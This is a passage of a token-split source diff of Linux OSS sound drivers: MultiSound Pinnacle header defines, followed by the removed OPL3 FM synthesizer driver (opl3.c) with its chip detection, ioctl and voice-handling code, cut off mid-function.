"HIDSP_SSI_TX_UNDER", "0x02", "#", "define", "HIDSP_RECQ_OVERFLOW", "0x08", "#", "define", "HIDSP_INT_RECORD_OVER", "0x09", "#", "define", "HIDSP_SSI_RX_OVERFLOW", "0x0a", "#", "define", "HIDSP_MIDI_IN_OVER", "0x10", "#", "define", "HIDSP_MIDI_FRAME_ERR", "0x11", "#", "define", "HIDSP_MIDI_PARITY_ERR", "0x12", "#", "define", "HIDSP_MIDI_OVERRUN_ERR", "0x13", "#", "define", "HIDSP_INPUT_CLIPPING", "0x20", "#", "define", "HIDSP_MIX_CLIPPING", "0x30", "#", "define", "HIDSP_DAT_IN_OFF", "0x21", "#", "define", "HDEXAR_SET_ANA_IN", "0", "#", "define", "HDEXAR_CLEAR_PEAKS", "1", "#", "define", "HDEXAR_IN_SET_POTS", "2", "#", "define", "HDEXAR_AUX_SET_POTS", "3", "#", "define", "HDEXAR_CAL_A_TO_D", "4", "#", "define", "HDEXAR_RD_EXT_DSP_BITS", "5", "#", "define", "HDEXAR_SET_SYNTH_IN", "4", "#", "define", "HDEXAR_READ_DAT_IN", "5", "#", "define", "HDEXAR_MIC_SET_POTS", "6", "#", "define", "HDEXAR_SET_DAT_IN", "7", "#", "define", "HDEXAR_SET_SYNTH_48", "8", "#", "define", "HDEXAR_SET_SYNTH_44", "9", "#", "define", "TIME_PRO_RESET_DONE", "0x028A", "#", "define", "TIME_PRO_SYSEX", "0x001E", "#", "define", "TIME_PRO_RESET", "0x0032", "#", "define", "AGND", "0x01", "#", "define", "SIGNAL", "0x02", "#", "define", "EXT_DSP_BIT_DCAL", "0x0001", "#", "define", "EXT_DSP_BIT_MIDI_CON", "0x0002", "#", "define", "BUFFSIZE", "0x8000", "#", "define", "HOSTQ_SIZE", "0x40", "#", "define", "SRAM_CNTL_START", "0x7F00", "#", "define", "SMA_STRUCT_START", "0x7F40", "#", "define", "DAP_BUFF_SIZE", "0x2400", "#", "define", "DAR_BUFF_SIZE", "0x2000", "#", "define", "DAPQ_STRUCT_SIZE", "0x10", "#", "define", "DARQ_STRUCT_SIZE", "0x10", "#", "define", "DAPQ_BUFF_SIZE", "(", "3", "*", "0x10", ")", "#", "define", "DARQ_BUFF_SIZE", "(", "3", "*", "0x10", ")", "#", "define", "MODQ_BUFF_SIZE", "0x400", "#", "define", "MIDQ_BUFF_SIZE", "0x800", "#", "define", "DSPQ_BUFF_SIZE", "0x5A0", "#", "define", "DAPQ_DATA_BUFF", "0x6C00", "#", "define", "DARQ_DATA_BUFF", "0x6C30", "#", "define", "MODQ_DATA_BUFF", "0x6C60", "#", "define", "MIDQ_DATA_BUFF", "0x7060", "#", "define", "DSPQ_DATA_BUFF", "0x7860", "#", "define", "DAPQ_OFFSET", "SRAM_CNTL_START", "#", "define", "DARQ_OFFSET", "(", "SRAM_CNTL_START", "+", "0x08", ")", "#", "define", "MODQ_OFFSET", "(", "SRAM_CNTL_START", "+", "0x10", ")", "#", "define", "MIDQ_OFFSET", "(", "SRAM_CNTL_START", "+", "0x18", ")", "#", "define", "DSPQ_OFFSET", "(", "SRAM_CNTL_START", "+", "0x20", ")", "#", "define", "MOP_WAVEHDR", "0", "#", "define", "MOP_EXTOUT", "1", "#", "define", "MOP_HWINIT", "0xfe", "#", "define", "MOP_NONE", "0xff", "#", "define", "MOP_MAX", "1", "#", "define", "MIP_EXTIN", "0", "#", "define", "MIP_WAVEHDR", "1", "#", "define", "MIP_HWINIT", "0xfe", "#", "define", "MIP_MAX", "1", "/", "*", "Pinnacle", "/", "Fiji", "SMA", "Common", "Data", "*", "/", "#", "define", "SMA_wCurrPlayBytes", "0x0000", "#", "define", "SMA_wCurrRecordBytes", "0x0002", "#", "define", "SMA_wCurrPlayVolLeft", "0x0004", "#", "define", "SMA_wCurrPlayVolRight", "0x0006", "#", "define", "SMA_wCurrInVolLeft", "0x0008", "#", "define", "SMA_wCurrInVolRight", "0x000a", "#", "define", "SMA_wCurrMHdrVolLeft", "0x000c", "#", "define", "SMA_wCurrMHdrVolRight", "0x000e", "#", "define", "SMA_dwCurrPlayPitch", "0x0010", "#", "define", "SMA_dwCurrPlayRate", "0x0014", "#", "define", "SMA_wCurrMIDIIOPatch", "0x0018", "#", "define", "SMA_wCurrPlayFormat", "0x001a", "#", "define", "SMA_wCurrPlaySampleSize", "0x001c", "#", "define", "SMA_wCurrPlayChannels", "0x001e", "#", "define", "SMA_wCurrPlaySampleRate", "0x0020", "#", "define", "SMA_wCurrRecordFormat", "0x0022", "#", "define", "SMA_wCurrRecordSampleSize", "0x0024", "#", "define", "SMA_wCurrRecordChannels", "0x0026", "#", "define", "SMA_wCurrRecordSampleRate", "0x0028", "#", "define", "SMA_wCurrDSPStatusFlags", "0x002a", "#", "define", "SMA_wCurrHostStatusFlags", "0x002c", "#", "define", "SMA_wCurrInputTagBits", "0x002e", "#", "define", "SMA_wCurrLeftPeak", "0x0030", "#", "define", "SMA_wCurrRightPeak", "0x0032", "#", "define", "SMA_bMicPotPosLeft", "0x0034", "#", "define", "SMA_bMicPotPosRight", "0x0035", "#", "define", "SMA_bMicPotMaxLeft", "0x0036", "#", "define", "SMA_bMicPotMaxRight", "0x0037", "#", "define", "SMA_bInPotPosLeft", "0x0038", "#", "define", "SMA_bInPotPosRight", "0x0039", "#", "define", "SMA_bAuxPotPosLeft", "0x003a", "#", "define", "SMA_bAuxPotPosRight", "0x003b", "#", "define", "SMA_bInPotMaxLeft", "0x003c", "#", "define", "SMA_bInPotMaxRight", "0x003d", "#", "define", "SMA_bAuxPotMaxLeft", "0x003e", "#", "define", "SMA_bAuxPotMaxRight", "0x003f", "#", "define", "SMA_bInPotMaxMethod", "0x0040", "#", "define", "SMA_bAuxPotMaxMethod", "0x0041", "#", "define", "SMA_wCurrMastVolLeft", "0x0042", "#", "define", "SMA_wCurrMastVolRight", "0x0044", "#", "define", "SMA_wCalFreqAtoD", "0x0046", "#", "define", "SMA_wCurrAuxVolLeft", "0x0048", "#", "define", "SMA_wCurrAuxVolRight", "0x004a", "#", "define", "SMA_wCurrPlay1VolLeft", "0x004c", "#", "define", "SMA_wCurrPlay1VolRight", "0x004e", "#", "define", "SMA_wCurrPlay2VolLeft", "0x0050", "#", "define", "SMA_wCurrPlay2VolRight", "0x0052", "#", "define", "SMA_wCurrPlay3VolLeft", "0x0054", "#", "define", "SMA_wCurrPlay3VolRight", "0x0056", "#", "define", "SMA_wCurrPlay4VolLeft", "0x0058", "#", "define", "SMA_wCurrPlay4VolRight", "0x005a", "#", "define", "SMA_wCurrPlay1PeakLeft", "0x005c", "#", "define", "SMA_wCurrPlay1PeakRight", "0x005e", "#", "define", "SMA_wCurrPlay2PeakLeft", "0x0060", "#", "define", "SMA_wCurrPlay2PeakRight", "0x0062", "#", "define", "SMA_wCurrPlay3PeakLeft", "0x0064", "#", "define", "SMA_wCurrPlay3PeakRight", "0x0066", "#", "define", "SMA_wCurrPlay4PeakLeft", "0x0068", "#", "define", "SMA_wCurrPlay4PeakRight", "0x006a", "#", "define", "SMA_wCurrPlayPeakLeft", "0x006c", "#", "define", "SMA_wCurrPlayPeakRight", "0x006e", "#", "define", "SMA_wCurrDATSR", "0x0070", "#", "define", "SMA_wCurrDATRXCHNL", "0x0072", "#", "define", "SMA_wCurrDATTXCHNL", "0x0074", "#", "define", "SMA_wCurrDATRXRate", "0x0076", "#", "define", "SMA_dwDSPPlayCount", "0x0078", "#", "define", "SMA__size", "0x007c", "#", "ifdef", "HAVE_DSPCODEH", "#", "include", "\"", "pndsperm", ".", "c", "\"", "#", "include", "\"", "pndspini", ".", "c", "\"", "#", "define", "PERMCODE", "pndsperm", "#", "define", "INITCODE", "pndspini", "#", "define", "PERMCODESIZE", "sizeof", "(", "pndsperm", ")", "#", "define", "INITCODESIZE", "sizeof", "(", "pndspini", ")", "#", "else", "#", "ifndef", "CONFIG_MSNDPIN_INIT_FILE", "#", "define", "CONFIG_MSNDPIN_INIT_FILE", "\\", "\"", "/", "etc", "/", "sound", "/", "pndspini", ".", "bin", "\"", "#", "endif", "#", "ifndef", "CONFIG_MSNDPIN_PERM_FILE", "#", "define", "CONFIG_MSNDPIN_PERM_FILE", "\\", "\"", "/", "etc", "/", "sound", "/", "pndsperm", ".", "bin", "\"", "#", "endif", "#", "define", "PERMCODEFILE", "CONFIG_MSNDPIN_PERM_FILE", "#", "define", "INITCODEFILE", "CONFIG_MSNDPIN_INIT_FILE", "#", "define", "PERMCODE", "dspini", "#", "define", "INITCODE", "permini", "#", "define", "PERMCODESIZE", "sizeof_dspini", "#", "define", "INITCODESIZE", "sizeof_permini", "#", "endif", "#", "define", "LONGNAME", "\"", "MultiSound", "(", "Pinnacle", "/", "Fiji", ")", "\"", "#", "endif", "/", "*", "__MSND_PINNACLE_H", "*", "/", "@", "@", "-", "1", ",", "1255", "+", "0", ",", "0", "@", "@", "/", "*", "*", "sound", "/", "oss", "/", "opl3", ".", "c", "*", "*", "A", "low", "level", "driver", "for", "Yamaha", "YM3812", "and", "OPL", "-", "3", "-", "chips", "*", "*", "*", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", "1993", "-", "1997", "*", "*", "OSS", "/", "Free", "for", "Linux", "is", "distributed", "under", "the", "GNU", "GENERAL", "PUBLIC", "LICENSE", "(", "GPL", ")", "*", "Version", "2", "(", "June", "1991", ")", ".", "See", "the", "\"", "COPYING", "\"", "file", "distributed", "with", "this", "software", "*", "for", "more", "info", ".", "*", "*", "*", "Changes", "*", "Thomas", "Sailer", "ioctl", "code", "reworked", "(", "vmalloc", "/", "vfree", "removed", ")", "*", "Alan", "Cox", "modularisation", ",", "fixed", "sound_mem", "allocs", ".", "*", "Christoph", "Hellwig", "Adapted", "to", "module_init", "/", "module_exit", "*", "Arnaldo", "C", ".", "de", "Melo", "get", "rid", "of", "check_region", ",", "use", "request_region", "for", "*", "OPL4", ",", "release", "it", "on", "exit", ",", "some", "cleanups", ".", "*", "*", "Status", "*", "Believed", "to", "work", ".", "Badly", "needs", "rewriting", "a", "bit", "to", "support", "multiple", "*", "OPL3", "devices", ".", "*", "/", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "/", "*", "*", "Major", "improvements", "to", "the", "FM", "handling", "30AUG92", "by", "Rob", "Hooft", ",", "*", "hooft", "@", "chem", ".", "ruu", ".", "nl", "*", "/", "#", "include", "\"", "sound_config", ".", "h", "\"", "#", "include", "\"", "opl3_hw", ".", "h", "\"", "#", "define", "MAX_VOICE", "18", "#", "define", "OFFS_4OP", "11", "struct", "voice_info", "{", "unsigned", "char", "keyon_byte", ";", "long", "bender", ";", "long", "bender_range", ";", "unsigned", "long", "orig_freq", ";", "unsigned", "long", "current_freq", ";", "int", "volume", ";", "int", "mode", ";", "int", "panning", ";", "/", "*", "0xffff", "means", "not", "set", "*", "/", "}", ";", "struct", "opl_devinfo", "{", "int", "base", ";", "int", "left_io", ",", "right_io", ";", "int", "nr_voice", ";", "int", "lv_map", "[", "MAX_VOICE", "]", ";", "struct", "voice_info", "voc", "[", "MAX_VOICE", "]", ";", "struct", "voice_alloc_info", "*", "v_alloc", ";", "struct", "channel_info", "*", "chn_info", ";", "struct", "sbi_instrument", "i_map", "[", "SBFM_MAXINSTR", "]", ";", "struct", "sbi_instrument", "*", "act_i", "[", "MAX_VOICE", "]", ";", "struct", "synth_info", "fm_info", ";", "int", "busy", ";", "int", "model", ";", "unsigned", "char", "cmask", ";", "int", "is_opl4", ";", "}", ";", "static", "struct", "opl_devinfo", "*", "devc", "=", "NULL", ";", "static", "int", "detected_model", ";", "static", "int", "store_instr", "(", "int", "instr_no", ",", "struct", "sbi_instrument", "*", "instr", ")", ";", "static", "void", "freq_to_fnum", "(", "int", "freq", ",", "int", "*", "block", ",", "int", "*", "fnum", ")", ";", "static", "void", "opl3_command", "(", "int", "io_addr", ",", "unsigned", "int", "addr", ",", "unsigned", "int", "val", ")", ";", "static", "int", "opl3_kill_note", "(", "int", "dev", ",", "int", "voice", ",", "int", "note", ",", "int", "velocity", ")", ";", "static", "void", "enter_4op_mode", "(", "void", ")", "{", "int", "i", ";", "static", "int", "v4op", "[", "MAX_VOICE", "]", "=", "{", "0", ",", "1", ",", "2", ",", "9", ",", "10", ",", "11", ",", "6", ",", "7", ",", "8", ",", "15", ",", "16", ",", "17", "}", ";", "devc", "-", ">", "cmask", "=", "0x3f", ";", "/", "*", "Connect", "all", "possible", "4", "OP", "voice", "operators", "*", "/", "opl3_command", "(", "devc", "-", ">", "right_io", ",", "CONNECTION_SELECT_REGISTER", ",", "0x3f", ")", ";", "for", "(", "i", "=", "0", ";", "i", "<", "3", ";", "i", "+", "+)", "pv_map", "[", "i", "]", ".", "voice_mode", "=", "4", ";", "for", "(", "i", "=", "3", ";", "i", "<", "6", ";", "i", "+", "+)", "pv_map", "[", "i", "]", ".", "voice_mode", "=", "0", ";", "for", "(", "i", "=", "9", ";", "i", "<", "12", ";", "i", "+", "+)", "pv_map", "[", "i", "]", ".", "voice_mode", "=", "4", ";", "for", "(", "i", "=", "12", ";", "i", "<", "15", ";", "i", "+", "+)", "pv_map", "[", "i", "]", ".", "voice_mode", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "12", ";", "i", "+", "+)", "devc", "-", ">", "lv_map", "[", "i", "]", "=", "v4op", "[", "i", "]", ";", "devc", "-", ">", "v_alloc", "-", ">", "max_voice", "=", "devc", "-", ">", "nr_voice", "=", "12", ";", "}", "static", "int", "opl3_ioctl", "(", "int", "dev", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", "{", "struct", "sbi_instrument", "ins", ";", "switch", "(", "cmd", ")", "{", "case", "SNDCTL_FM_LOAD_INSTR", ":", "printk", "(", "KERN_WARNING", "\"", "Warning", ":", "Obsolete", "ioctl", "(", "SNDCTL_FM_LOAD_INSTR", ")", "used", ".", "Fix", "the", "program", ".", "\\", "n", "\"", ");", "if", "(", "copy_from_user", "(", "&", "ins", ",", "arg", ",", "sizeof", "(", "ins", ")", "))", "return", "-", "EFAULT", ";", "if", "(", "ins", ".", "channel", "<", "0", "|", "|", "ins", ".", "channel", ">", "=", "SBFM_MAXINSTR", ")", "{", "printk", "(", "KERN_WARNING", "\"", "FM", "Error", ":", "Invalid", "instrument", "number", "%", "d", "\\", "n", "\"", ",", "ins", ".", "channel", ")", ";", "return", "-", "EINVAL", ";", "}", "return", "store_instr", "(", "ins", ".", "channel", ",", "&", "ins", ")", ";", "case", "SNDCTL_SYNTH_INFO", ":", "devc", "-", ">", "fm_info", ".", "nr_voices", "=", "(", "devc", "-", ">", "nr_voice", "=", "=", "12", ")", "?", "6", ":", "devc", "-", ">", "nr_voice", ";", "if", "(", "copy_to_user", "(", "arg", ",", "&", "devc", "-", ">", "fm_info", ",", "sizeof", "(", "devc", "-", ">", "fm_info", ")", "))", "return", "-", "EFAULT", ";", "return", "0", ";", "case", "SNDCTL_SYNTH_MEMAVL", ":", "return", "0x7fffffff", ";", "case", "SNDCTL_FM_4OP_ENABLE", ":", "if", "(", "devc", "-", ">", "model", "=", "=", "2", ")", "enter_4op_mode", "(", ");", "return", "0", ";", "default", ":", "return", "-", "EINVAL", ";", "}", "}", "static", "int", "opl3_detect", "(", "int", "ioaddr", ")", "{", "/", "*", "*", "This", "function", "returns", "1", "if", "the", "FM", "chip", "is", "present", "at", "the", "given", "I", "/", "O", "port", "*", "The", "detection", "algorithm", "plays", "with", "the", "timer", "built", "in", "the", "FM", "chip", "and", "*", "looks", "for", "a", "change", "in", "the", "status", "register", ".", "*", "*", "Note", "!", "The", "timers", "of", "the", "FM", "chip", "are", "not", "connected", "to", "AdLib", "(", "and", "compatible", ")", "*", "boards", ".", "*", "*", "Note2", "!", "The", "chip", "is", "initialized", "if", "detected", ".", "*", "/", "unsigned", "char", "stat1", ",", "signature", ";", "int", "i", ";", "if", "(", "devc", "!", "=", "NULL", ")", "{", "printk", "(", "KERN_ERR", "\"", "opl3", ":", "Only", "one", "OPL3", "supported", ".", "\\", "n", "\"", ");", "return", "0", ";", "}", "devc", "=", "kzalloc", "(", "sizeof", "(", "*", "devc", ")", ",", "GFP_KERNEL", ")", ";", "if", "(", "devc", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_ERR", "\"", "opl3", ":", "Can", "'", "t", "allocate", "memory", "for", "the", "device", "control", "\"", "\"", "structure", "\\", "n", "\"", ");", "return", "0", ";", "}", "strcpy", "(", "devc", "-", ">", "fm_info", ".", "name", ",", "\"", "OPL2", "\"", ");", "if", "(", "!", "request_region", "(", "ioaddr", ",", "4", ",", "devc", "-", ">", "fm_info", ".", "name", ")", ")", "{", "printk", "(", "KERN_WARNING", "\"", "opl3", ":", "I", "/", "O", "port", "0x", "%", "x", "already", "in", "use", "\\", "n", "\"", ",", "ioaddr", ")", ";", "goto", "cleanup_devc", ";", "}", "devc", "-", ">", "base", "=", "ioaddr", ";", "/", "*", "Reset", "timers", "1", "and", "2", "*", "/", "opl3_command", "(", "ioaddr", ",", "TIMER_CONTROL_REGISTER", ",", "TIMER1_MASK", "|", "TIMER2_MASK", ")", ";", "/", "*", "Reset", "the", "IRQ", "of", "the", "FM", "chip", "*", "/", "opl3_command", "(", "ioaddr", ",", "TIMER_CONTROL_REGISTER", ",", "IRQ_RESET", ")", ";", "signature", "=", "stat1", "=", "inb", "(", "ioaddr", ")", ";", "/", "*", "Status", "register", "*", "/", "if", "(", "signature", "!", "=", "0x00", "&", "&", "signature", "!", "=", "0x06", "&", "&", "signature", "!", "=", "0x02", "&", "&", "signature", "!", "=", "0x0f", ")", "{", "MDB", "(", "printk", "(", "KERN_INFO", "\"", "OPL3", "not", "detected", "%", "x", "\\", "n", "\"", ",", "signature", ")", ");", "goto", "cleanup_region", ";", "}", "if", "(", "signature", "=", "=", "0x06", ")", "/", "*", "OPL2", "*", "/", "{", "detected_model", "=", "2", ";", "}", "else", "if", "(", "signature", "=", "=", "0x00", "|", "|", "signature", "=", "=", "0x0f", ")", "/", "*", "OPL3", "or", "OPL4", "*", "/", "{", "unsigned", "char", "tmp", ";", "detected_model", "=", "3", ";", "/", "*", "*", "Detect", "availability", "of", "OPL4", "(", "_experimental_", ")", ".", "Works", "probably", "*", "only", "after", "a", "cold", "boot", ".", "In", "addition", "the", "OPL4", "port", "*", "of", "the", "chip", "may", "not", "be", "connected", "to", "the", "PC", "bus", "at", "all", ".", "*", "/", "opl3_command", "(", "ioaddr", "+", "2", ",", "OPL3_MODE_REGISTER", ",", "0x00", ")", ";", "opl3_command", "(", "ioaddr", "+", "2", ",", "OPL3_MODE_REGISTER", ",", "OPL3_ENABLE", "|", "OPL4_ENABLE", ")", ";", "if", "(", "(", "tmp", "=", "inb", "(", "ioaddr", ")", ")", "=", "=", "0x02", ")", "/", "*", "Have", "a", "OPL4", "*", "/", "{", "detected_model", "=", "4", ";", "}", "if", "(", "request_region", "(", "ioaddr", "-", "8", ",", "2", ",", "\"", "OPL4", "\"", "))", "/", "*", "OPL4", "port", "was", "free", "*", "/", "{", "int", "tmp", ";", "outb", "(", "(", "0x02", ")", ",", "ioaddr", "-", "8", ")", ";", "/", "*", "Select", "OPL4", "ID", "register", "*", "/", "udelay", "(", "10", ")", ";", "tmp", "=", "inb", "(", "ioaddr", "-", "7", ")", ";", "/", "*", "Read", "it", "*", "/", "udelay", "(", "10", ")", ";", "if", "(", "tmp", "=", "=", "0x20", ")", "/", "*", "OPL4", "should", "return", "0x20", "here", "*", "/", "{", "detected_model", "=", "4", ";", "outb", "(", "(", "0xF8", ")", ",", "ioaddr", "-", "8", ")", ";", "/", "*", "Select", "OPL4", "FM", "mixer", "control", "*", "/", "udelay", "(", "10", ")", ";", "outb", "(", "(", "0x1B", ")", ",", "ioaddr", "-", "7", ")", ";", "/", "*", "Write", "value", "*", "/", "udelay", "(", "10", ")", ";", "}", "else", "{", "/", "*", "release", "OPL4", "port", "*", "/", "release_region", "(", "ioaddr", "-", "8", ",", "2", ")", ";", "detected_model", "=", "3", ";", "}", "}", "opl3_command", "(", "ioaddr", "+", "2", ",", "OPL3_MODE_REGISTER", ",", "0", ")", ";", "}", "for", "(", "i", "=", "0", ";", "i", "<", "9", ";", "i", "+", "+)", "opl3_command", "(", "ioaddr", ",", "KEYON_BLOCK", "+", "i", ",", "0", ")", ";", "/", "*", "*", "Note", "off", "*", "/", "opl3_command", "(", "ioaddr", ",", "TEST_REGISTER", ",", "ENABLE_WAVE_SELECT", ")", ";", "opl3_command", "(", "ioaddr", ",", "PERCOSSION_REGISTER", ",", "0x00", ")", ";", "/", "*", "*", "Melodic", "mode", ".", "*", "/", "return", "1", ";", "cleanup_region", ":", "release_region", "(", "ioaddr", ",", "4", ")", ";", "cleanup_devc", ":", "kfree", "(", "devc", ")", ";", "devc", "=", "NULL", ";", "return", "0", ";", "}", "static", "int", "opl3_kill_note", "(", "int", "devno", ",", "int", "voice", ",", "int", "note", ",", "int", "velocity", ")", "{", "struct", "physical_voice_info", "*", "map", ";", "if", "(", "voice", "<", "0", "|", "|", "voice", ">", "=", "devc", "-", ">", "nr_voice", ")", "return", "0", ";", "devc", "-", ">", "v_alloc", "-", ">", "map", "[", "voice", "]", "=", "0", ";", "map", "=", "&", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "voice", "]", "];", "if", "(", "map", "-", ">", "voice_mode", "=", "=", "0", ")", "return", "0", ";", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KEYON_BLOCK", "+", "map", "-", ">", "voice_num", ",", "devc", "-", ">", "voc", "[", "voice", "]", ".", "keyon_byte", "&", "~", "0x20", ")", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "keyon_byte", "=", "0", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "bender", "=", "0", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "volume", "=", "64", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "panning", "=", "0xffff", ";", "/", "*", "Not", "set", "*", "/", "devc", "-", ">", "voc", "[", "voice", "]", ".", "bender_range", "=", "200", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "orig_freq", "=", "0", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "current_freq", "=", "0", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "mode", "=", "0", ";", "return", "0", ";", "}", "#", "define", "HIHAT", "0", "#", "define", "CYMBAL", "1", "#", "define", "TOMTOM", "2", "#", "define", "SNARE", "3", "#", "define", "BDRUM", "4", "#", "define", "UNDEFINED", "TOMTOM", "#", "define", "DEFAULT", "TOMTOM", "static", "int", "store_instr", "(", "int", "instr_no", ",", "struct", "sbi_instrument", "*", "instr", ")", "{", "if", "(", "instr", "-", ">", "key", "!", "=", "FM_PATCH", "&", "&", "(", "instr", "-", ">", "key", "!", "=", "OPL3_PATCH", "|", "|", "devc", "-", ">", "model", "!", "=", "2", ")", ")", "printk", "(", "KERN_WARNING", "\"", "FM", "warning", ":", "Invalid", "patch", "format", "field", "(", "key", ")", "0x", "%", "x", "\\", "n", "\"", ",", "instr", "-", ">", "key", ")", ";", "memcpy", "(", "(", "char", "*", ")", "&", "(", "devc", "-", ">", "i_map", "[", "instr_no", "]", "),", "(", "char", "*", ")", "instr", ",", "sizeof", "(", "*", "instr", ")", ");", "return", "0", ";", "}", "static", "int", "opl3_set_instr", "(", "int", "dev", ",", "int", "voice", ",", "int", "instr_no", ")", "{", "if", "(", "voice", "<", "0", "|", "|", "voice", ">", "=", "devc", "-", ">", "nr_voice", ")", "return", "0", ";", "if", "(", "instr_no", "<", "0", "|", "|", "instr_no", ">", "=", "SBFM_MAXINSTR", ")", "instr_no", "=", "0", ";", "/", "*", "Acoustic", "piano", "(", "usually", ")", "*", "/", "devc", "-", ">", "act_i", "[", "voice", "]", "=", "&", "devc", "-", ">", "i_map", "[", "instr_no", "]", ";", "return", "0", ";", "}", "/", "*", "*", "The", "next", "table", "looks", "magical", ",", "but", "it", "certainly", "is", "not", ".", "Its", "values", "have", "*", "been", "calculated", "as", "table", "[", "i", "]", "=", "8", "*", "log", "(", "i", "/", "64", ")", "/", "log", "(", "2", ")", "with", "an", "obvious", "exception", "*", "for", "i", "=", "0", ".", "This", "log", "-", "table", "converts", "a", "linear", "volume", "-", "scaling", "(", "0", ".", ".", "127", ")", "to", "a", "*", "logarithmic", "scaling", "as", "present", "in", "the", "FM", "-", "synthesizer", "chips", ".", "so", ":", "Volume", "*", "64", "=", "0", "db", "=", "relative", "volume", "0", "and", ":", "Volume", "32", "=", "-", "6", "db", "=", "relative", "*", "volume", "-", "8", "it", "was", "implemented", "as", "a", "table", "because", "it", "is", "only", "128", "bytes", "and", "*", "it", "saves", "a", "lot", "of", "log", "(", ")", "calculations", ".", "(", "RH", ")", "*", "/", "static", "char", "fm_volume_table", "[", "128", "]", "=", "{", "-", "64", ",", "-", "48", ",", "-", "40", ",", "-", "35", ",", "-", "32", ",", "-", "29", ",", "-", "27", ",", "-", "26", ",", "-", "24", ",", "-", "23", ",", "-", "21", ",", "-", "20", ",", "-", "19", ",", "-", "18", ",", "-", "18", ",", "-", "17", ",", "-", "16", ",", "-", "15", ",", "-", "15", ",", "-", "14", ",", "-", "13", ",", "-", "13", ",", "-", "12", ",", "-", "12", ",", "-", "11", ",", "-", "11", ",", "-", "10", ",", "-", "10", ",", "-", "10", ",", "-", "9", ",", "-", "9", ",", "-", "8", ",", "-", "8", ",", "-", "8", ",", "-", "7", ",", "-", "7", ",", "-", "7", ",", "-", "6", ",", "-", "6", ",", "-", "6", ",", "-", "5", ",", "-", "5", ",", "-", "5", ",", "-", "5", ",", "-", "4", ",", "-", "4", ",", "-", "4", ",", "-", "4", ",", "-", "3", ",", "-", "3", ",", "-", "3", ",", "-", "3", ",", "-", "2", ",", "-", "2", ",", "-", "2", ",", "-", "2", ",", "-", "2", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "1", ",", "1", ",", "1", ",", "1", ",", "1", ",", "1", ",", "2", ",", "2", ",", "2", ",", "2", ",", "2", ",", "2", ",", "2", ",", "3", ",", "3", ",", "3", ",", "3", ",", "3", ",", "3", ",", "3", ",", "4", ",", "4", ",", "4", ",", "4", ",", "4", ",", "4", ",", "4", ",", "4", ",", "5", ",", "5", ",", "5", ",", "5", ",", "5", ",", "5", ",", "5", ",", "5", ",", "5", ",", "6", ",", "6", ",", "6", ",", "6", ",", "6", ",", "6", ",", "6", ",", "6", ",", "6", ",", "7", ",", "7", ",", "7", ",", "7", ",", "7", ",", "7", ",", "7", ",", "7", ",", "7", ",", "7", ",", "8", ",", "8", ",", "8", ",", "8", ",", "8", "}", ";", "static", "void", "calc_vol", "(", "unsigned", "char", "*", "regbyte", ",", "int", "volume", ",", "int", "main_vol", ")", "{", "int", "level", "=", "(", "~*", "regbyte", "&", "0x3f", ")", ";", "if", "(", "main_vol", ">", "127", ")", "main_vol", "=", "127", ";", "volume", "=", "(", "volume", "*", "main_vol", ")", "/", "127", ";", "if", "(", "level", ")", "level", "+", "=", "fm_volume_table", "[", "volume", "]", ";", "if", "(", "level", ">", "0x3f", ")", "level", "=", "0x3f", ";", "if", "(", "level", "<", "0", ")", "level", "=", "0", ";", "*", "regbyte", "=", "(", "*", "regbyte", "&", "0xc0", ")", "|", "(", "~", "level", "&", "0x3f", ")", ";", "}", "static", "void", "set_voice_volume", "(", "int", "voice", ",", "int", "volume", ",", "int", "main_vol", ")", "{", "unsigned", "char", "vol1", ",", "vol2", ",", "vol3", ",", "vol4", ";", "struct", "sbi_instrument", "*", "instr", ";", "struct", "physical_voice_info", "*", "map", ";", "if", "(", "voice", "<", "0", "|", "|", "voice", ">", "=", "devc", "-", ">", "nr_voice", ")", "return", ";", "map", "=", "&", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "voice", "]", "];", "instr", "=", "devc", "-", ">", "act_i", "[", "voice", "]", ";", "if", "(", "!", "instr", ")", "instr", "=", "&", "devc", "-", ">", "i_map", "[", "0", "]", ";", "if", "(", "instr", "-", ">", "channel", "<", "0", ")", "return", ";", "if", "(", "devc", "-", ">", "voc", "[", "voice", "]", ".", "mode", "=", "=", "0", ")", "return", ";", "if", "(", "devc", "-", ">", "voc", "[", "voice", "]", ".", "mode", "=", "=", "2", ")", "{", "vol1", "=", "instr", "-", ">", "operators", "[", "2", "]", ";", "vol2", "=", "instr", "-", ">", "operators", "[", "3", "]", ";", "if", "(", "(", "instr", "-", ">", "operators", "[", "10", "]", "&", "0x01", ")", ")", "{", "calc_vol", "(", "&", "vol1", ",", "volume", ",", "main_vol", ")", ";", "calc_vol", "(", "&", "vol2", ",", "volume", ",", "main_vol", ")", ";", "}", "else", "{", "calc_vol", "(", "&", "vol2", ",", "volume", ",", "main_vol", ")", ";", "}", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KSL_LEVEL", "+", "map", "-", ">", "op", "[", "0", "]", ",", "vol1", ")", ";", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KSL_LEVEL", "+", "map", "-", ">", "op", "[", "1", "]", ",", "vol2", ")", ";", "}", "else", "{", "/", "*", "*", "4", "OP", "voice", "*", "/", "int", "connection", ";", "vol1", "=", "instr", "-", ">", "operators", "[", "2", "]", ";", "vol2", "=", "instr", "-", ">", "operators", "[", "3", "]", ";", "vol3", "=", "instr", "-", ">", "operators", "[", "OFFS_4OP", "+", "2", "]", ";", "vol4", "=", "instr", "-", ">", "operators", "[", "OFFS_4OP", "+", "3", "]", ";", "/", "*", "*", "The", 